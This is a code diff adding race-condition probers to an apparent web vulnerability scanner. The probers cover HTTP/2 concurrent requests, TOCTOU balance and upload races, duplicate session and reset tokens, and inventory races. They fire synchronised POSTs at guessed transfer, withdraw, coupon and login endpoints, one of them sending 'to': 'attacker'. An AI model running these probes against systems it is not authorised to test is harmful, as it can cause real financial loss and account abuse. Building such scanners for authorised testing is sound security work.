@@ -859,3 +859,737 @@ class RaceConditionScanner(BaseScanner):
             except Exception as exc:
                 _race_logger.warning("[RaceScanner] %s failed: %s", prober.name, exc)
         return all_results
+
+
+# ============================================================================
+# HTTP/2 CONCURRENT + TOCTOU ATTACK CLASSES
+# HTTP2ConcurrentStreamProber, TOCTOUProber,
+# SessionFixationRaceProber, InventoryRaceProber, RaceDeepScanner
+# ============================================================================
+import asyncio
+import collections
+
+_deep_race_logger = logging.getLogger(__name__ + ".deep")
+
+# Success indicator keywords found in response bodies
+_SUCCESS_KEYWORDS = frozenset([
+    "success", "ok", "approved", "accepted", "confirmed",
+    "redeemed", "applied", "coupon_code", "discount",
+    "balance", "credited", "charged", "booked", "reserved",
+])
+
+
+def _has_success_indicator(body: str) -> bool:
+    """Check if a response body contains race-win success indicators."""
+    lower = body.lower()
+    return any(kw in lower for kw in _SUCCESS_KEYWORDS)
+
+
+# ===========================================================================
+# HTTP2ConcurrentStreamProber — HTTP/2 multi-stream race
+# ===========================================================================
+class HTTP2ConcurrentStreamProber(BaseScanner):
+    """
+    Send 20-50 identical requests over a single HTTP/2 connection simultaneously.
+    HTTP/2 multiplexing means all requests share one connection — maximum timing collision.
+    Targets: coupon redemption, vote, like, transfer, purchase, withdraw, apply-promo.
+    """
+    name = "race_http2_concurrent"
+
+    _TARGET_PATHS = [
+        "/api/coupon/redeem",
+        "/api/promo/apply",
+        "/api/vote",
+        "/api/like",
+        "/api/transfer",
+        "/api/withdraw",
+        "/api/checkout",
+        "/api/purchase",
+        "/api/apply-promo",
+        "/api/v1/coupon/redeem",
+        "/api/v1/transfer",
+    ]
+
+    _N_CONCURRENT = 30
+
+    def run(self, target: str, **kwargs) -> List[Dict]:
+        results: List[Dict] = []
+        parsed = urllib.parse.urlparse(target)
+        base   = f"{parsed.scheme}://{parsed.netloc}"
+
+        for path in self._TARGET_PATHS:
+            url = base.rstrip("/") + path
+            # Quick availability check (skip 404/410)
+            try:
+                r_check = self.session.get(url, timeout=4)
+                if r_check.status_code in (404, 410):
+                    continue
+            except Exception:
+                continue
+
+            finding = self._race_http2(url)
+            if finding:
+                results.append(finding)
+                self.report_finding(**finding)
+                break  # One confirmed race is sufficient per target
+
+        return results
+
+    def _race_http2(self, url: str) -> Optional[Dict]:
+        """Fire N concurrent HTTP/2 POST requests and detect duplicate successes."""
+        try:
+            responses = self._run_async_race(url, self._N_CONCURRENT)
+        except Exception as exc:
+            _deep_race_logger.debug("[HTTP2Race] async race failed for %s: %s", url, exc)
+            return None
+
+        if not responses:
+            return None
+
+        successes = [
+            r for r in responses
+            if isinstance(r, tuple) and r[0] in range(200, 300)
+            and _has_success_indicator(r[1])
+        ]
+
+        # Also check for inconsistent response bodies (race evidence)
+        bodies = [r[1] for r in responses if isinstance(r, tuple)]
+        unique_bodies = len(set(bodies))
+
+        if len(successes) > 1:
+            return {
+                "vuln_type": "Race Condition — HTTP/2 Concurrent Stream",
+                "url": url,
+                "severity": "Critical",
+                "description": (
+                    f"HTTP/2 concurrent stream race: {len(successes)}/{self._N_CONCURRENT} "
+                    "simultaneous requests returned success indicators. "
+                    "The server processed the same one-time action multiple times within "
+                    "the HTTP/2 multiplexing window."
+                ),
+                "evidence": {
+                    "concurrent_requests": self._N_CONCURRENT,
+                    "success_count": len(successes),
+                    "unique_bodies": unique_bodies,
+                    "sample_statuses": [r[0] for r in responses if isinstance(r, tuple)][:10],
+                },
+            }
+        elif unique_bodies > 1 and len(bodies) > 5:
+            # Inconsistent responses may indicate a race condition even without explicit success
+            return {
+                "vuln_type": "Race Condition — HTTP/2 Inconsistent Responses",
+                "url": url,
+                "severity": "Medium",
+                "description": (
+                    f"HTTP/2 concurrent stream race produced {unique_bodies} distinct response "
+                    f"bodies across {self._N_CONCURRENT} requests. Inconsistent state may "
+                    "indicate a race condition in server processing."
+                ),
+                "evidence": {
+                    "concurrent_requests": self._N_CONCURRENT,
+                    "unique_response_bodies": unique_bodies,
+                },
+            }
+
+        return None
+
+    def _run_async_race(self, url: str, n: int) -> List[tuple]:
+        """Run async HTTP/2 race in a new event loop."""
+        async def _race():
+            try:
+                import httpx
+            except ImportError:
+                return []
+
+            payload = {
+                "code": "RACE10",
+                "amount": "1",
+                "quantity": "1",
+                "promo": "PROMO10",
+            }
+
+            results = []
+            try:
+                async with httpx.AsyncClient(http2=True, verify=False,
+                                              timeout=15.0) as client:
+                    tasks = [
+                        client.post(url, data=payload)
+                        for _ in range(n)
+                    ]
+                    raw_results = await asyncio.gather(*tasks, return_exceptions=True)
+                    for r in raw_results:
+                        if isinstance(r, Exception):
+                            results.append((0, ""))
+                        else:
+                            results.append((r.status_code, r.text[:300]))
+            except Exception as exc:
+                _deep_race_logger.debug("[HTTP2Race] gather error: %s", exc)
+            return results
+
+        try:
+            loop = asyncio.new_event_loop()
+            try:
+                return loop.run_until_complete(_race())
+            finally:
+                loop.close()
+        except Exception as exc:
+            _deep_race_logger.debug("[HTTP2Race] event loop error: %s", exc)
+            return []
+
+
+# ===========================================================================
+# TOCTOUProber — Time-of-Check / Time-of-Use vulnerability
+# ===========================================================================
+class TOCTOUProber(BaseScanner):
+    """
+    TOCTOU: read state, then race to consume it before the server re-checks.
+    Patterns: balance/quota/inventory, file upload collision.
+    """
+    name = "race_toctou"
+
+    _BALANCE_PATHS = [
+        "/api/balance",
+        "/api/account/balance",
+        "/api/user/balance",
+        "/api/points",
+        "/api/credits",
+        "/api/quota",
+    ]
+    _SPEND_PATHS = [
+        ("/api/transfer",      {"amount": "100", "to": "attacker"}),
+        ("/api/withdraw",      {"amount": "100"}),
+        ("/api/spend",         {"amount": "1"}),
+        ("/api/redeem",        {"points": "10"}),
+        ("/api/quota/consume", {"bytes": "1024"}),
+    ]
+    _UPLOAD_PATHS = [
+        "/api/upload",
+        "/upload",
+        "/api/files/upload",
+    ]
+
+    _N_CONCURRENT = 10
+
+    def run(self, target: str, **kwargs) -> List[Dict]:
+        results: List[Dict] = []
+        parsed = urllib.parse.urlparse(target)
+        base   = f"{parsed.scheme}://{parsed.netloc}"
+
+        # 1. Balance/quota TOCTOU
+        balance_finding = self._probe_balance_toctou(base)
+        if balance_finding:
+            results.append(balance_finding)
+            self.report_finding(**balance_finding)
+
+        # 2. File upload TOCTOU (same filename twice simultaneously)
+        upload_finding = self._probe_upload_toctou(base)
+        if upload_finding:
+            results.append(upload_finding)
+            self.report_finding(**upload_finding)
+
+        return results
+
+    def _probe_balance_toctou(self, base: str) -> Optional[Dict]:
+        """Step 1: Read balance. Step 2: Race spend. Step 3: Re-read balance."""
+        balance_url = None
+        for path in self._BALANCE_PATHS:
+            url = base.rstrip("/") + path
+            try:
+                r = self.session.get(url, timeout=4)
+                if r.status_code not in (404, 410, 401):
+                    balance_url = url
+                    break
+            except Exception:
+                pass
+
+        spend_url = None
+        spend_data = {}
+        for path, data in self._SPEND_PATHS:
+            url = base.rstrip("/") + path
+            try:
+                r = self.session.get(url, timeout=4)
+                if r.status_code not in (404, 410):
+                    spend_url = url
+                    spend_data = data
+                    break
+            except Exception:
+                pass
+
+        if not spend_url:
+            return None
+
+        # Step 1: GET initial balance
+        initial_balance_text = ""
+        if balance_url:
+            try:
+                r = self.session.get(balance_url, timeout=5)
+                initial_balance_text = r.text[:200]
+            except Exception:
+                pass
+
+        # Step 2: Fire N concurrent POSTs
+        successes = []
+        lock = threading.Lock()
+        gate = threading.Barrier(self._N_CONCURRENT, timeout=5)
+
+        def _spend():
+            try:
+                gate.wait()
+                r = self.session.post(spend_url, data=spend_data, timeout=8)
+                if r.status_code in (200, 201):
+                    with lock:
+                        successes.append(r.text[:100])
+            except threading.BrokenBarrierError:
+                pass
+            except Exception:
+                pass
+
+        threads = [threading.Thread(target=_spend) for _ in range(self._N_CONCURRENT)]
+        for t in threads:
+            t.start()
+        for t in threads:
+            t.join(timeout=12)
+
+        # Step 3: GET final balance
+        final_balance_text = ""
+        if balance_url:
+            try:
+                r = self.session.get(balance_url, timeout=5)
+                final_balance_text = r.text[:200]
+            except Exception:
+                pass
+
+        if len(successes) > 1:
+            return {
+                "vuln_type": "TOCTOU — Balance/Quota Race",
+                "url": spend_url,
+                "severity": "Critical",
+                "description": (
+                    f"TOCTOU race condition: {len(successes)}/{self._N_CONCURRENT} concurrent "
+                    f"spend/transfer requests succeeded. The server's balance/quota check "
+                    "is not atomic — multiple requests passed the check before any deduction occurred."
+                ),
+                "evidence": {
+                    "spend_url": spend_url,
+                    "concurrent_requests": self._N_CONCURRENT,
+                    "concurrent_successes": len(successes),
+                    "initial_balance": initial_balance_text,
+                    "final_balance": final_balance_text,
+                },
+            }
+        return None
+
+    def _probe_upload_toctou(self, base: str) -> Optional[Dict]:
+        """Upload the same filename twice simultaneously — check if both succeed."""
+        upload_url = None
+        for path in self._UPLOAD_PATHS:
+            url = base.rstrip("/") + path
+            try:
+                r = self.session.get(url, timeout=4)
+                if r.status_code not in (404, 410):
+                    upload_url = url
+                    break
+            except Exception:
+                pass
+
+        if not upload_url:
+            return None
+
+        filename = f"toctou_race_{_canary_str(6)}.txt"
+        file_content = b"TOCTOU race condition test file"
+        successes = []
+        lock = threading.Lock()
+        gate = threading.Barrier(5, timeout=5)
+
+        def _upload():
+            try:
+                gate.wait()
+                files = {"file": (filename, file_content, "text/plain")}
+                r = self.session.post(upload_url, files=files, timeout=10)
+                if r.status_code in (200, 201):
+                    with lock:
+                        successes.append(r.status_code)
+            except threading.BrokenBarrierError:
+                pass
+            except Exception:
+                pass
+
+        threads = [threading.Thread(target=_upload) for _ in range(5)]
+        for t in threads:
+            t.start()
+        for t in threads:
+            t.join(timeout=15)
+
+        if len(successes) > 1:
+            return {
+                "vuln_type": "TOCTOU — Concurrent File Upload Race",
+                "url": upload_url,
+                "severity": "Critical",
+                "description": (
+                    f"TOCTOU file upload race: {len(successes)}/5 concurrent uploads "
+                    f"of the same filename '{filename}' succeeded. "
+                    "The server does not atomically check-and-create files, allowing "
+                    "race conditions that may lead to file overwrite or path traversal."
+                ),
+                "evidence": {
+                    "upload_url": upload_url,
+                    "filename": filename,
+                    "concurrent_successes": len(successes),
+                },
+            }
+        return None
+
+
+# ===========================================================================
+# SessionFixationRaceProber — Duplicate session tokens via race
+# ===========================================================================
+class SessionFixationRaceProber(BaseScanner):
+    """
+    Race on session/token creation:
+    - 20 concurrent login requests → check for duplicate session tokens
+    - 20 concurrent password reset requests → check for duplicate reset tokens
+    - Token entropy analysis: < 64 bits of randomness → Critical
+    """
+    name = "race_session"
+
+    _LOGIN_PATHS  = ["/login", "/api/login", "/auth/login", "/signin", "/api/auth/login"]
+    _RESET_PATHS  = ["/forgot-password", "/api/password/reset", "/api/auth/reset",
+                     "/reset-password", "/api/reset"]
+    _N_CONCURRENT = 20
+
+    def run(self, target: str, **kwargs) -> List[Dict]:
+        results: List[Dict] = []
+        parsed = urllib.parse.urlparse(target)
+        base   = f"{parsed.scheme}://{parsed.netloc}"
+
+        # 1. Login session token race
+        login_finding = self._probe_login_tokens(base)
+        if login_finding:
+            results.append(login_finding)
+            self.report_finding(**login_finding)
+
+        # 2. Password reset token race
+        reset_finding = self._probe_reset_tokens(base)
+        if reset_finding:
+            results.append(reset_finding)
+            self.report_finding(**reset_finding)
+
+        return results
+
+    def _collect_tokens_concurrent(self, url: str, payload: dict,
+                                   n: int) -> List[str]:
+        """Fire N concurrent POSTs and collect session tokens from responses."""
+        tokens: List[str] = []
+        lock = threading.Lock()
+        gate = threading.Barrier(n, timeout=5)
+
+        def _attempt():
+            try:
+                import requests
+                s = requests.Session()
+                gate.wait()
+                r = s.post(url, json=payload, timeout=8)
+                # Try cookie, header, and body for tokens
+                token = (
+                    r.cookies.get("session")
+                    or r.cookies.get("token")
+                    or r.cookies.get("auth_token")
+                    or r.headers.get("X-Session-Token")
+                    or r.headers.get("X-Auth-Token")
+                    or r.headers.get("Authorization", "").replace("Bearer ", "")
+                )
+                # Also try JSON body
+                if not token:
+                    try:
+                        body = r.json()
+                        token = (
+                            body.get("token")
+                            or body.get("access_token")
+                            or body.get("session_token")
+                            or body.get("reset_token")
+                        )
+                    except Exception:
+                        pass
+                if token and isinstance(token, str) and len(token) > 4:
+                    with lock:
+                        tokens.append(token)
+            except threading.BrokenBarrierError:
+                pass
+            except Exception:
+                pass
+
+        threads = [threading.Thread(target=_attempt) for _ in range(n)]
+        for t in threads:
+            t.start()
+        for t in threads:
+            t.join(timeout=15)
+
+        return tokens
+
+    def _probe_login_tokens(self, base: str) -> Optional[Dict]:
+        login_url = None
+        for path in self._LOGIN_PATHS:
+            url = base.rstrip("/") + path
+            try:
+                r = self.session.get(url, timeout=4)
+                if r.status_code not in (404, 410):
+                    login_url = url
+                    break
+            except Exception:
+                pass
+
+        if not login_url:
+            return None
+
+        payload = {"username": "race_test_user", "password": _canary_str(12)}
+        tokens = self._collect_tokens_concurrent(login_url, payload, self._N_CONCURRENT)
+
+        if not tokens:
+            return None
+
+        unique_tokens = set(tokens)
+        total = len(tokens)
+        unique = len(unique_tokens)
+
+        if unique < total and total > 1:
+            return {
+                "vuln_type": "Race Condition — Duplicate Session Token",
+                "url": login_url,
+                "severity": "Critical",
+                "description": (
+                    f"Concurrent login race produced duplicate session tokens: "
+                    f"{unique} unique tokens from {total} concurrent requests. "
+                    "Duplicate tokens indicate a race condition in session generation, "
+                    "enabling session fixation attacks."
+                ),
+                "evidence": {
+                    "concurrent_requests": self._N_CONCURRENT,
+                    "tokens_collected": total,
+                    "unique_tokens": unique,
+                    "duplicate_count": total - unique,
+                },
+            }
+
+        # Token entropy check: collect token lengths and check for short tokens
+        if tokens:
+            entropy_finding = self._check_token_entropy(tokens, login_url)
+            if entropy_finding:
+                return entropy_finding
+
+        return None
+
+    def _probe_reset_tokens(self, base: str) -> Optional[Dict]:
+        reset_url = None
+        for path in self._RESET_PATHS:
+            url = base.rstrip("/") + path
+            try:
+                r = self.session.get(url, timeout=4)
+                if r.status_code not in (404, 410):
+                    reset_url = url
+                    break
+            except Exception:
+                pass
+
+        if not reset_url:
+            return None
+
+        payload = {"email": f"race_{_canary_str(6)}@example.com"}
+        tokens = self._collect_tokens_concurrent(reset_url, payload, self._N_CONCURRENT)
+
+        if not tokens:
+            return None
+
+        unique_tokens = set(tokens)
+        total = len(tokens)
+        unique = len(unique_tokens)
+
+        if unique < total and total > 1:
+            return {
+                "vuln_type": "Race Condition — Duplicate Password Reset Token",
+                "url": reset_url,
+                "severity": "Critical",
+                "description": (
+                    f"Concurrent password reset race produced duplicate tokens: "
+                    f"{unique} unique tokens from {total} requests. "
+                    "An attacker who triggers concurrent resets may obtain another user's "
+                    "reset token, enabling account takeover."
+                ),
+                "evidence": {
+                    "concurrent_requests": self._N_CONCURRENT,
+                    "tokens_collected": total,
+                    "unique_tokens": unique,
+                },
+            }
+
+        return None
+
+    def _check_token_entropy(self, tokens: List[str], url: str) -> Optional[Dict]:
+        """
+        Estimate token entropy.
+        Tokens shorter than 16 hex chars (< 64 bits) are flagged.
+        """
+        try:
+            # Estimate bits of entropy: count unique characters * log2(charset)
+            sample = tokens[0] if tokens else ""
+            if len(sample) < 16:
+                # Very short token — almost certainly < 64 bits
+                return {
+                    "vuln_type": "Low Entropy Session Token",
+                    "url": url,
+                    "severity": "Critical",
+                    "description": (
+                        f"Session token is only {len(sample)} characters long "
+                        f"(sample: {sample[:8]}...). "
+                        "Tokens shorter than 16 hex characters have less than 64 bits of entropy "
+                        "and are susceptible to brute-force prediction."
+                    ),
+                    "evidence": {
+                        "token_length": len(sample),
+                        "sample_prefix": sample[:8],
+                        "min_recommended_bits": 64,
+                    },
+                }
+        except Exception:
+            pass
+        return None
+
+
+# ===========================================================================
+# InventoryRaceProber — Last-item/coupon/seat race
+# ===========================================================================
+class InventoryRaceProber(BaseScanner):
+    """
+    Race on limited resources: purchase last item, redeem last coupon, claim last seat.
+    Fires 20 concurrent requests to claim the same resource — if >1 succeeds → Critical.
+    Also checks for negative stock / zero-quantity success.
+    """
+    name = "race_inventory"
+
+    _INVENTORY_ENDPOINTS = [
+        ("/api/items/purchase",       {"item_id": 1, "quantity": 1}),
+        ("/api/coupon/claim",         {"coupon_id": 1}),
+        ("/api/seat/reserve",         {"seat_id": 1, "event_id": 1}),
+        ("/api/ticket/purchase",      {"ticket_id": 1}),
+        ("/api/product/buy",          {"product_id": 1, "quantity": 1}),
+        ("/api/reward/claim",         {"reward_id": 1}),
+        ("/api/slot/book",            {"slot_id": 1}),
+        ("/api/giveaway/enter",       {"giveaway_id": 1}),
+        ("/api/flash-sale/purchase",  {"item_id": 1}),
+    ]
+
+    _N_CONCURRENT = 20
+
+    def run(self, target: str, **kwargs) -> List[Dict]:
+        results: List[Dict] = []
+        parsed = urllib.parse.urlparse(target)
+        base   = f"{parsed.scheme}://{parsed.netloc}"
+
+        for path, payload in self._INVENTORY_ENDPOINTS:
+            url = base.rstrip("/") + path
+            # Check endpoint exists
+            try:
+                r_check = self.session.get(url, timeout=3)
+                if r_check.status_code in (404, 410):
+                    continue
+            except Exception:
+                continue
+
+            finding = self._probe_inventory_race(url, payload)
+            if finding:
+                results.append(finding)
+                self.report_finding(**finding)
+                break  # One confirmed finding per target
+
+        return results
+
+    def _probe_inventory_race(self, url: str, payload: dict) -> Optional[Dict]:
+        """Fire N concurrent claim requests and check for multiple successes."""
+        successes: List[Dict] = []
+        all_statuses: List[int] = []
+        all_bodies: List[str] = []
+        lock = threading.Lock()
+        gate = threading.Barrier(self._N_CONCURRENT, timeout=5)
+
+        def _attempt():
+            try:
+                import requests
+                s = requests.Session()
+                gate.wait()
+                r = s.post(url, json=payload, timeout=10)
+                body_snippet = r.text[:150]
+                with lock:
+                    all_statuses.append(r.status_code)
+                    all_bodies.append(body_snippet)
+                    if r.status_code in (200, 201):
+                        successes.append({
+                            "status": r.status_code,
+                            "body": body_snippet,
+                        })
+            except threading.BrokenBarrierError:
+                pass
+            except Exception:
+                pass
+
+        threads = [threading.Thread(target=_attempt) for _ in range(self._N_CONCURRENT)]
+        for t in threads:
+            t.start()
+        for t in threads:
+            t.join(timeout=15)
+
+        if len(successes) > 1:
+            # Check for negative stock indicators
+            negative_stock = any(
+                "quantity: 0" in b or '"quantity":0' in b or "out of stock" in b.lower()
+                or "negative" in b.lower()
+                for b in all_bodies
+                if b
+            )
+            return {
+                "vuln_type": "Race Condition — Inventory/Resource Race",
+                "url": url,
+                "severity": "Critical",
+                "description": (
+                    f"Inventory race: {len(successes)}/{self._N_CONCURRENT} concurrent "
+                    "requests to claim the same limited resource all succeeded. "
+                    "The server's inventory check is not atomic — double-booking, "
+                    "negative stock, or duplicate resource allocation is possible."
+                ),
+                "evidence": {
+                    "url": url,
+                    "concurrent_requests": self._N_CONCURRENT,
+                    "successful_claims": len(successes),
+                    "negative_stock_detected": negative_stock,
+                    "sample_statuses": all_statuses[:10],
+                    "sample_responses": [s["body"] for s in successes[:3]],
+                },
+            }
+        return None
+
+
+# ===========================================================================
+# RaceDeepScanner — Orchestrator for all 4 deep race probers
+# ===========================================================================
+class RaceDeepScanner(BaseScanner):
+    """
+    Deep race condition attack orchestrator:
+    HTTP2ConcurrentStreamProber + TOCTOUProber +
+    SessionFixationRaceProber + InventoryRaceProber
+    """
+    name = "race_deep"
+
+    def run(self, target: str, **kwargs) -> List[Dict]:
+        all_results: List[Dict] = []
+        probers = [
+            HTTP2ConcurrentStreamProber(session=self.session, results=self.results),
+            TOCTOUProber(session=self.session, results=self.results),
+            SessionFixationRaceProber(session=self.session, results=self.results),
+            InventoryRaceProber(session=self.session, results=self.results),
+        ]
+        for prober in probers:
+            try:
+                prober.target = target
+                res = prober.run(target, **kwargs)
+                all_results.extend(res)
+            except Exception as exc:
+                _deep_race_logger.warning("[RaceDeep] %s failed: %s", prober.name, exc)
+        return all_results
